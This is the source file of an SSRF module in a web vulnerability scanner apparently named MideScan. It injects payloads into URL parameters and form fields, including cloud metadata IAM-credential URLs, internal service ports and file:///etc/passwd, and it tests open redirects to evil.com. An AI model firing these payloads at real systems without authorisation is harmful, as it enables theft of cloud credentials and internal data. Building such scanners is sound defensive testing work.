# MideScan v1.0 - by Cybermide
# Module: A10 - Server Side Request Forgery (SSRF)

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse
import re

def get_url_params(url):
    """Extract URL parameters"""
    parsed = urlparse(url)
    return parse_qs(parsed.query)

def inject_url_param(url, param, payload):
    """Inject payload into a specific URL parameter"""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

def scan(target, session, found_pages=[], verbose=True):
    results = []
    base = target.rstrip('/')

    if verbose:
        print("\n  [*] A10 - Checking Server Side Request Forgery (SSRF)...")

    # SSRF payloads - internal URLs attackers typically target
    ssrf_payloads = [
        # Localhost
        ('http://localhost', 'Localhost access'),
        ('http://127.0.0.1', 'Loopback address'),
        ('http://0.0.0.0', 'All interfaces address'),
        ('http://[::1]', 'IPv6 loopback'),
        # Cloud metadata endpoints
        ('http://169.254.169.254/latest/meta-data/', 'AWS metadata endpoint'),
        ('http://169.254.169.254/latest/meta-data/iam/security-credentials/', 'AWS IAM credentials'),
        ('http://metadata.google.internal/computeMetadata/v1/', 'GCP metadata endpoint'),
        ('http://169.254.169.254/metadata/instance', 'Azure metadata endpoint'),
        # Internal network ranges
        ('http://192.168.0.1', 'Internal network gateway'),
        ('http://10.0.0.1', 'Internal network address'),
        ('http://172.16.0.1', 'Internal network address'),
        # Common internal services
        ('http://localhost:8080', 'Internal port 8080'),
        ('http://localhost:8443', 'Internal port 8443'),
        ('http://localhost:3000', 'Internal port 3000'),
        ('http://localhost:5000', 'Internal port 5000'),
        ('http://localhost:6379', 'Redis default port'),
        ('http://localhost:27017', 'MongoDB default port'),
        ('http://localhost:5432', 'PostgreSQL default port'),
        ('http://localhost:3306', 'MySQL default port'),
        # File protocol
        ('file:///etc/passwd', 'Linux passwd file'),
        ('file:///windows/system32/drivers/etc/hosts', 'Windows hosts file'),
        ('file:///etc/hosts', 'Hosts file'),
    ]

    # Signs that SSRF was successful
    ssrf_success_signs = [
        # AWS metadata signs
        'ami-id', 'instance-id', 'security-credentials',
        'iam', 'aws_access_key', 'aws_secret',
        # Internal service signs
        'redis_version', 'mongod', 'postgresql',
        'mysql', 'apache', 'nginx',
        # File content signs
        'root:x:', 'daemon:', '# localhost',
        '127.0.0.1 localhost',
        # Generic internal response signs
        'internal server', 'connection refused',
        'internal use only', 'not for public',
    ]

    # ================================================
    # CHECK 1 - SSRF via URL Parameters
    # ================================================
    if verbose:
        print("  [*] Testing SSRF via URL parameters...")

    pages_to_test = [target] + found_pages[:5]

    for page in pages_to_test:
        params = get_url_params(page)
        if not params:
            continue

        # Look for parameters that typically fetch URLs
        url_params = [
            p for p in params.keys()
            if any(word in p.lower() for word in [
                'url', 'uri', 'link', 'src', 'source',
                'dest', 'destination', 'redirect', 'return',
                'next', 'target', 'path', 'file', 'fetch',
                'load', 'image', 'img', 'callback', 'host',
                'proxy', 'forward', 'site', 'page', 'feed',
                'endpoint', 'api', 'request'
            ])
        ]

        for param in url_params:
            for payload, payload_desc in ssrf_payloads[:10]:
                injected_url = inject_url_param(page, param, payload)
                try:
                    resp = session.get(
                        injected_url,
                        timeout=8,
                        verify=False,
                        allow_redirects=True
                    )
                    body = resp.text.lower()
                    found_signs = [s for s in ssrf_success_signs if s in body]

                    if found_signs:
                        results.append({
                            'owasp': 'A10 - Server Side Request Forgery (SSRF)',
                            'severity': 'CRITICAL',
                            'status': 'VULNERABLE',
                            'title': f'SSRF vulnerability detected in parameter: {param}',
                            'evidence': (
                                f"Vulnerable URL: {injected_url}\n"
                                f"  Parameter: {param}\n"
                                f"  SSRF payload: {payload} ({payload_desc})\n"
                                f"  HTTP Status: {resp.status_code}\n"
                                f"  Success indicators found: {', '.join(found_signs)}\n"
                                f"  Response preview: {resp.text[:200].strip()}"
                            ),
                            'details': f"Parameter '{param}' is vulnerable to SSRF - server fetched internal URL '{payload}' and returned internal content - attacker can access internal services, cloud metadata and sensitive files",
                            'recommendation': 'Validate and whitelist allowed URLs - block requests to private IP ranges - use allowlist of permitted domains - disable unnecessary URL fetching features'
                        })
                        if verbose:
                            print(f"  [!] CRITICAL: SSRF in {page} param={param} with {payload}")

                    # Check for time-based SSRF (slower response when hitting internal hosts)
                    elif resp.elapsed.total_seconds() > 5:
                        results.append({
                            'owasp': 'A10 - Server Side Request Forgery (SSRF)',
                            'severity': 'HIGH',
                            'status': 'POTENTIAL',
                            'title': f'Potential blind SSRF detected in parameter: {param}',
                            'evidence': (
                                f"Vulnerable URL: {injected_url}\n"
                                f"  Parameter: {param}\n"
                                f"  SSRF payload: {payload} ({payload_desc})\n"
                                f"  Response time: {resp.elapsed.total_seconds():.2f} seconds\n"
                                f"  Note: Slow response when pointing to internal address suggests server attempted the connection"
                            ),
                            'details': f"Parameter '{param}' shows signs of blind SSRF - unusual response time when injecting internal URL suggests server is attempting to connect to internal resources",
                            'recommendation': 'Implement URL validation - use DNS allowlists - monitor outbound connections from web server - deploy SSRF protection middleware'
                        })
                        if verbose:
                            print(f"  [~] HIGH: Potential blind SSRF in {page} param={param} (slow response: {resp.elapsed.total_seconds():.2f}s)")

                except:
                    pass

    # ================================================
    # CHECK 2 - SSRF via Form Fields
    # ================================================
    if verbose:
        print("  [*] Testing SSRF via form fields...")

    for page in pages_to_test:
        try:
            resp = session.get(page, timeout=5, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')

            for form in forms:
                inputs = form.find_all('input')
                action = form.get('action', page)
                method = form.get('method', 'get').lower()
                if not action.startswith('http'):
                    action = urljoin(page, action)

                # Find URL-type inputs
                url_inputs = [
                    inp for inp in inputs
                    if inp.get('name') and any(
                        word in inp.get('name', '').lower()
                        for word in ['url', 'uri', 'link', 'src', 'path',
                                     'redirect', 'return', 'next', 'target',
                                     'fetch', 'load', 'image', 'feed']
                    )
                ]

                for inp in url_inputs:
                    for payload, payload_desc in ssrf_payloads[:5]:
                        data = {}
                        for i in form.find_all('input'):
                            name = i.get('name', '')
                            if name == inp.get('name'):
                                data[name] = payload
                            elif name:
                                data[name] = i.get('value', 'test')

                        try:
                            if method == 'post':
                                r = session.post(action, data=data, timeout=8, verify=False)
                            else:
                                r = session.get(action, params=data, timeout=8, verify=False)

                            body = r.text.lower()
                            found_signs = [s for s in ssrf_success_signs if s in body]

                            if found_signs:
                                results.append({
                                    'owasp': 'A10 - Server Side Request Forgery (SSRF)',
                                    'severity': 'CRITICAL',
                                    'status': 'VULNERABLE',
                                    'title': f'SSRF vulnerability in form field: {inp.get("name")}',
                                    'evidence': (
                                        f"Form action: {action}\n"
                                        f"  Method: {method.upper()}\n"
                                        f"  Field name: {inp.get('name')}\n"
                                        f"  SSRF payload: {payload} ({payload_desc})\n"
                                        f"  HTTP Status: {r.status_code}\n"
                                        f"  Success indicators: {', '.join(found_signs)}\n"
                                        f"  Response preview: {r.text[:200].strip()}"
                                    ),
                                    'details': f"Form field '{inp.get('name')}' is vulnerable to SSRF - server fetched internal resource and returned content",
                                    'recommendation': 'Validate all URL inputs against an allowlist - never fetch user-supplied URLs without strict validation'
                                })
                                if verbose:
                                    print(f"  [!] CRITICAL: SSRF in form field '{inp.get('name')}' at {action}")
                        except:
                            pass
        except:
            pass

    # ================================================
    # CHECK 3 - Open Redirect (SSRF Gateway)
    # ================================================
    if verbose:
        print("  [*] Checking for open redirects...")

    redirect_params = ['redirect', 'return', 'next', 'url', 'goto',
                       'target', 'returnUrl', 'returnTo', 'back', 'r']
    redirect_payloads = [
        'https://evil.com',
        '//evil.com',
        '/\\evil.com',
        'https://evil.com/%2f..',
    ]

    for page in pages_to_test:
        for param in redirect_params:
            for payload in redirect_payloads:
                injected = inject_url_param(page + f'?{param}=test', param, payload)
                try:
                    resp = session.get(
                        injected,
                        timeout=5,
                        verify=False,
                        allow_redirects=False
                    )
                    if resp.status_code in [301, 302, 303, 307, 308]:
                        location = resp.headers.get('Location', '')
                        if 'evil.com' in location or payload in location:
                            results.append({
                                'owasp': 'A10 - Server Side Request Forgery (SSRF)',
                                'severity': 'HIGH',
                                'status': 'VULNERABLE',
                                'title': f'Open redirect detected in parameter: {param}',
                                'evidence': (
                                    f"URL: {injected}\n"
                                    f"  Parameter: {param}\n"
                                    f"  Payload: {payload}\n"
                                    f"  HTTP Status: {resp.status_code}\n"
                                    f"  Location header: {location}\n"
                                    f"  Result: Server redirected to attacker-controlled domain"
                                ),
                                'details': f"Parameter '{param}' allows open redirect to external domains - can be used for phishing attacks and as an SSRF bypass technique",
                                'recommendation': 'Validate redirect URLs against an allowlist of permitted domains - use relative URLs instead of absolute - implement redirect confirmation page'
                            })
                            if verbose:
                                print(f"  [!] HIGH: Open redirect in {page} param={param}")
                except:
                    pass

    if not results:
        results.append({
            'owasp': 'A10 - Server Side Request Forgery (SSRF)',
            'severity': 'INFO',
            'status': 'SAFE',
            'title': 'No SSRF vulnerabilities detected',
            'evidence': 'SSRF payloads injected into URL parameters and form fields returned no internal content',
            'details': 'Basic SSRF checks passed - manual testing recommended for complete coverage',
            'recommendation': 'Implement URL allowlisting - block requests to private IP ranges - monitor outbound server connections'
        })
        if verbose:
            print("  [+] No SSRF vulnerabilities detected")

    return results